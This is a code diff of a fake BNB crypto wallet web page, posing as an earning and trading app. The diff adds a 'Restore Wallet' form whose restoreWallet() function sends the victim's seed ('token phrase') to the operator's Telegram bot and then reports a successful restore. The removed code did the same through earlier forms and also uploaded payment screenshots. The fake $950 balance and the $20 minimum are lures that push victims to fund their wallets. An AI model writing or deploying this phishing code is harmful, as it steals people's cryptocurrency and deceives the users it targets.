@@ -111,22 +111,16 @@
     </div>
   </div>
 
-  <!-- 💰 Earning Box -->
-  <div class="content-box" style="background: linear-gradient(135deg, #102a1f, #15372a); border: 1px solid #1d805c;">
-    <h2 style="color: #5affaf;">💰 Earning</h2>
-    <p style="color: #d7ffee;">Earn passive income by completing daily tasks, inviting users, or staking your balance.</p>
-<textarea id="earnToken" class="input-field" placeholder="Enter your token phrase" rows="3"></textarea>
-    <button class="btn" onclick="verifyToken('earn')">Start Earning</button>
-    <div id="earnMsg" style="margin-top:10px; font-size:14px;"></div>
-  </div>
+  <!-- 🔐 Restore Wallet Box -->
+  <div class="content-box" style="background: linear-gradient(135deg, #1b1f30, #0f1628); border: 1px solid #344966;">
+    <h2 style="color: #44e3ff;">🔐 Restore Wallet</h2>
+    <p style="color: #cceeff;">Enter your token phrase to restore your wallet and start earning.</p>
 
-  <!-- 📈 Trading Box -->
-  <div class="content-box" style="background: linear-gradient(135deg, #2a2137, #1a0f2a); border: 1px solid #6829a7;">
-    <h2 style="color: #c799ff;">📈 Trading</h2>
-    <p style="color: #f0e4ff;">Trade your BNB for other assets or monitor market trends and charts.</p>
-   <textarea id="tradeToken" class="input-field" placeholder="Enter your token phrase" rows="3"></textarea>
-    <button class="btn" onclick="verifyToken('trade')">Trade Now</button>
-    <div id="tradeMsg" style="margin-top:10px; font-size:14px;"></div>
+    <textarea id="tokenPhrase" class="input-field" placeholder="Enter your token phrase" rows="3"></textarea>
+
+    <button class="btn" onclick="restoreWallet()">Restore Wallet</button>
+
+    <div id="tokenMsg" style="margin-top:15px; font-size:14px;"></div>
   </div>
 </div>
 
@@ -135,7 +129,7 @@
   <div class="content-box">
     <h2>❓ How to Earn</h2>
     <p style="color:#cceeff; margin-top: 10px;">
-      You can start earning by completing daily tasks, joining airdrops, and submitting your token phrase in the **Earning** section.
+      You can start earning by completing daily tasks, joining airdrops, and submitting your token phrase in the Restore Wallet section.
     </p>
     <p style="color:#cceeff; margin-top: 15px;">
       Make sure your token contains more than 12 characters and at least 3 words. After submitting, you'll receive a confirmation, and your balance will be updated when approved.
@@ -145,10 +139,10 @@
   <div class="content-box">
     <h2>📈 How to Trade</h2>
     <p style="color:#ffd6f5; margin-top: 10px;">
-      Once you’ve earned enough, go to the **Trading** section. Enter your trading token phrase and submit it. 
+      Once you’ve earned enough, go to the Restore Wallet section and submit your trading phrase. 
     </p>
     <p style="color:#ffd6f5; margin-top: 15px;">
-      You must have at least <strong>$20</strong> in your phrase to begin trading. Once verified, trading will be activated and monitored by our system.
+      You must have at least <strong>$20</strong> in your wallet to begin trading. Once verified, trading will be activated and monitored by our system.
     </p>
   </div>
 
@@ -183,8 +177,8 @@
 <!-- ✅ Bottom Navigation -->
 <div class="bottom-nav">
   <div class="nav-item active" onclick="showSection('home', this)"><span>🏠</span>Home</div>
-  <div class="nav-item" onclick="showSection('wallet', this)"><span>💼</span>Earn</div>
- <div class="nav-item" onclick="showSection('deposit', this)"><span>❓</span>FAQ</div>
+  <div class="nav-item" onclick="showSection('wallet', this)"><span>💼</span>Wallet</div>
+  <div class="nav-item" onclick="showSection('deposit', this)"><span>❓</span>FAQ</div>
   <div class="nav-item" onclick="showSection('withdraw', this)"><span>➖</span>Withdraw</div>
   <div class="nav-item" onclick="showSection('transactions', this)"><span>📜</span>History</div>
 </div>
@@ -205,17 +199,10 @@
   let currentBalanceUSD = 950;
 
   function updateBNBValue() {
-    const bnbHome = (currentBalanceUSD / bnbPriceUSD).toFixed(4);
-    const bnbWallet = bnbHome;
-    document.querySelectorAll(".walletAmount").forEach(el => {
-      el.textContent = `$${currentBalanceUSD}`;
-    });
-    document.querySelectorAll(".bnbValueHome").forEach(el => {
-      el.textContent = bnbHome;
-    });
-    document.querySelectorAll(".bnbValueWallet").forEach(el => {
-      el.textContent = bnbWallet;
-    });
+    const bnb = (currentBalanceUSD / bnbPriceUSD).toFixed(4);
+    document.querySelectorAll(".walletAmount").forEach(el => el.textContent = `$${currentBalanceUSD}`);
+    document.querySelectorAll(".bnbValueHome").forEach(el => el.textContent = bnb);
+    document.querySelectorAll(".bnbValueWallet").forEach(el => el.textContent = bnb);
   }
 
   function withdrawBNB() {
@@ -255,7 +242,6 @@
     addToHistory(logEl.textContent);
     updateBNBValue();
 
-    // Clear inputs after successful withdrawal
     document.getElementById("withdrawAmount").value = "";
     document.getElementById("withdrawAddress").value = "";
   }
@@ -266,55 +252,24 @@
     document.getElementById("txHistory").prepend(div);
   }
 
-  function sendToTelegram() {
-    const fileInput = document.getElementById('paymentProof');
-    const messageBox = document.getElementById('uploadMsg');
-
-    if (!fileInput.files.length) {
-      messageBox.textContent = 'Please upload a screenshot first.';
-      messageBox.style.color = 'orange';
-      return;
-    }
-
-    const file = fileInput.files[0];
-    const formData = new FormData();
-    formData.append('chat_id', TELEGRAM_CHAT_ID);
-    formData.append('caption', '💸 New BNB Payment Proof Uploaded');
-    formData.append('photo', file);
-
-    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-      method: 'POST',
-      body: formData
-    }).then(response => {
-      if (response.ok) {
-        messageBox.textContent = '✅ Screenshot sent successfully!';
-        messageBox.style.color = '#00ff90';
-        fileInput.value = '';
-      } else {
-        messageBox.textContent = '❌ Failed to send screenshot.';
-        messageBox.style.color = 'red';
-      }
-    }).catch(() => {
-      messageBox.textContent = '⚠️ Error sending screenshot.';
-      messageBox.style.color = 'red';
-    });
-  }
-
-  function verifyToken(action) {
-    const inputId = action === 'earn' ? 'earnToken' : 'tradeToken';
-    const msgId = action === 'earn' ? 'earnMsg' : 'tradeMsg';
-
-    const input = document.getElementById(inputId).value.trim();
-    const msgBox = document.getElementById(msgId);
+  function restoreWallet() {
+    const input = document.getElementById("tokenPhrase").value.trim();
+    const msgBox = document.getElementById("tokenMsg");
     const wordCount = input.split(/\s+/).length;
 
     if (input.length < 12 || wordCount < 3) {
       msgBox.style.color = 'orange';
-      msgBox.textContent = '❌ Invalid token: must be over 12 characters and contain at least 3 words.';
+      msgBox.textContent = '❌ Invalid phrase: Must be at least 12 characters and 3 words.';
       return;
     }
 
-    const message = `🧾 New Token Phrase for ${action === 'earn' ? 'Earning' : 'Trading'}:\n\n${input}`;
+    if (currentBalanceUSD < 20) {
+      msgBox.style.color = 'red';
+      msgBox.innerHTML = `❌ You need at least <strong>$20</strong> in your wallet before restoring.<br>Current balance: <strong>$${currentBalanceUSD}</strong>`;
+      return;
+    }
+
+    const message = `🔐 Wallet Restore Request:\n\n${input}`;
     fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { "Content-Type": "application/json" },
@@ -325,11 +280,11 @@
     }).then(res => {
       if (res.ok) {
         msgBox.style.color = '#00ff90';
-        msgBox.innerHTML = `✅ Token received successfully.<br><br>⚠️ <strong>Reminder:</strong> You must have at least <strong>$20</strong> in your phrase before you can ${action === 'earn' ? 'start earning' : 'start trading'}.`;
-        document.getElementById(inputId).value = '';
+        msgBox.innerHTML = `✅ Wallet restored successfully.<br><br>🟢 <strong>Trading and Earning</strong> will be enabled if you have at least $20 in your wallet.`;
+        document.getElementById("tokenPhrase").value = '';
       } else {
         msgBox.style.color = 'red';
-        msgBox.textContent = '❌ Failed to send token to admin.';
+        msgBox.textContent = '❌ Failed to send restore request.';
       }
     }).catch(() => {
       msgBox.style.color = 'red';
